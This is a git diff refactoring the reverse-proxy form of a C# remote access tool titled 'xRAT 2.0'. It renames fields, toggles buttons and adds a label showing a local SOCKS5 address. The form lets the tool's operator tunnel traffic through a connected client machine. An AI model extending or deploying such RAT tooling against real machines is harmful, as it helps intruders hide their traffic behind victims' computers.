@@ -1,9 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Text;
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.ReverseProxy;
@@ -12,100 +7,101 @@ namespace xServer.Forms
 {
     public partial class FrmReverseProxy : Form
     {
-        public Client client { get; private set; }
-        public ReverseProxyServer socksServer { get; private set; }
+        private readonly Client _connectClient;
+        private ReverseProxyServer SocksServer { get; set; }
         private delegate void Invoky();
 
         public FrmReverseProxy(Client client)
         {
             InitializeComponent();
-            this.client = client;
+            this._connectClient = client;
         }
 
         private void FrmReverseProxy_Load(object sender, EventArgs e)
         {
-            this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", client.EndPoint.Address.ToString(), client.EndPoint.Port.ToString());
+            this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
         }
 
         private void btnStart_Click(object sender, EventArgs e)
         {
             try
             {
-                socksServer = new ReverseProxyServer();
-                socksServer.onConnectionEstablished += socksServer_onConnectionEstablished;
-                socksServer.onUpdateConnection += socksServer_onUpdateConnection;
-                socksServer.StartServer(client, "0.0.0.0", (int)nudServerPort.Value);
+                SocksServer = new ReverseProxyServer();
+                SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
+                SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
+                SocksServer.StartServer(_connectClient, "0.0.0.0", (int)nudServerPort.Value);
+                btnStart.Enabled = false;
+                btnStop.Enabled = true;
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
-                btnStop_Click(null, null);
+                btnStop_Click(sender, null);
             }
         }
 
-        void socksServer_onUpdateConnection(ReverseProxyClient ProxyClient)
+        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
         {
-            if (ProxyClient.ListItem != null)
+            if (proxyClient.ListItem != null)
             {
                 this.Invoke(new Invoky(() =>
                 {
                     lock (LvConnections)
                     {
-                        string TotalReceivedStr = GetSizeStr(ProxyClient.LengthReceived);
-                        string TotalSendStr = GetSizeStr(ProxyClient.LengthSended);
+                        string totalReceivedStr = GetSizeStr(proxyClient.LengthReceived);
+                        string totalSendStr = GetSizeStr(proxyClient.LengthSended);
 
-                        ProxyClient.ListItem.SubItems[0].Text = ProxyClient.TargetServer;
-                        ProxyClient.ListItem.SubItems[1].Text = ProxyClient.TargetPort.ToString();
+                        proxyClient.ListItem.SubItems[0].Text = proxyClient.TargetServer;
+                        proxyClient.ListItem.SubItems[1].Text = proxyClient.TargetPort.ToString();
 
-                        if (ProxyClient.ListItem.SubItems[2].Text != TotalReceivedStr)
-                            ProxyClient.ListItem.SubItems[2].Text = TotalReceivedStr;
+                        if (proxyClient.ListItem.SubItems[2].Text != totalReceivedStr)
+                            proxyClient.ListItem.SubItems[2].Text = totalReceivedStr;
 
-                        if (ProxyClient.ListItem.SubItems[3].Text != TotalSendStr)
-                            ProxyClient.ListItem.SubItems[3].Text = TotalSendStr;
+                        if (proxyClient.ListItem.SubItems[3].Text != totalSendStr)
+                            proxyClient.ListItem.SubItems[3].Text = totalSendStr;
 
 
 
-                        if (!ProxyClient.IsConnected)
+                        if (!proxyClient.IsConnected)
                         {
-                            LvConnections.Items.Remove(ProxyClient.ListItem);
+                            LvConnections.Items.Remove(proxyClient.ListItem);
                         }
                     }
                 }));
             }
         }
 
-        private string GetSizeStr(long Size)
+        private string GetSizeStr(long size)
         {
-            if (Size > (1024 * 1024 * 1024))
-                return (Size / (1024 * 1024 * 1024)) + "GB";
+            if (size > (1024 * 1024 * 1024))
+                return (size / (1024 * 1024 * 1024)) + "GB";
 
-            if (Size > (1024 * 1024))
-                return (Size / (1024 * 1024)) + "MB";
+            if (size > (1024 * 1024))
+                return (size / (1024 * 1024)) + "MB";
 
-            if (Size > 1024)
-                return (Size / 1024) + "KB";
+            if (size > 1024)
+                return (size / 1024) + "KB";
 
-            return Size + "B";
+            return size + "B";
         }
 
-        void socksServer_onConnectionEstablished(ReverseProxyClient ProxyClient)
+        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
         {
-            if (ProxyClient.ListItem == null)
+            if (proxyClient.ListItem == null)
             {
                 this.Invoke(new Invoky(() =>
                 {
                     lock (LvConnections)
                     {
-                        ProxyClient.ListItem = new ListViewItem(new string[]
+                        proxyClient.ListItem = new ListViewItem(new string[]
                         {
-                            ProxyClient.TargetServer,
-                            ProxyClient.TargetPort.ToString(),
-                            ProxyClient.LengthReceived / 1024 + "KB",
-                            ProxyClient.LengthSended / 1024 + "KB",
-                            ProxyClient.Type.ToString()
-                        });
-                        ProxyClient.ListItem.Tag = ProxyClient;
-                        LvConnections.Items.Add(ProxyClient.ListItem);
+                            proxyClient.TargetServer,
+                            proxyClient.TargetPort.ToString(),
+                            proxyClient.LengthReceived/1024 + "KB",
+                            proxyClient.LengthSended/1024 + "KB",
+                            proxyClient.Type.ToString()
+                        }) { Tag = proxyClient };
+                        LvConnections.Items.Add(proxyClient.ListItem);
                     }
                 }));
             }
@@ -113,13 +109,15 @@ namespace xServer.Forms
 
         private void btnStop_Click(object sender, EventArgs e)
         {
-            if (socksServer != null)
-                socksServer.Stop();
+            btnStart.Enabled = true;
+            btnStop.Enabled = false;
+            if (SocksServer != null)
+                SocksServer.Stop();
 
             try
             {
-                socksServer.onConnectionEstablished -= socksServer_onConnectionEstablished;
-                socksServer.onUpdateConnection -= socksServer_onUpdateConnection;
+                SocksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
+                SocksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
             }
             catch { }
         }
@@ -127,7 +125,12 @@ namespace xServer.Forms
         private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
         {
             //Stop the proxy server if still active
-            btnStop_Click(null, null);
+            btnStop_Click(sender, null);
+        }
+
+        private void nudServerPort_ValueChanged(object sender, EventArgs e)
+        {
+            lblProxyInfo.Text = string.Format("Connect to this Socks5 Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
         }
     }
 }
